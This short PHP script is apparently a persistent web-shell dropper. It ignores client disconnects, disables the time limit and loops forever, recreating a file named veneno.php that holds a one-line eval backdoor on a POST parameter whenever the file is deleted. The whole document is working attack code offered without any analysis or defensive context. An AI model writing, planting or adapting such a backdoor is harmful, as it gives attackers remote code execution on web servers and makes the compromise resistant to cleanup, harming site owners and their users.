<?php
ignore_user_abort(true);
set_time_limit(0);
$file = "veneno.php";
$shell = "<?php eval($_POST[venenohi]);?>";
while (TRUE) {
if (!file_exists($file)) {
file_put_contents($file, $shell);
}
usleep(50);
}
?>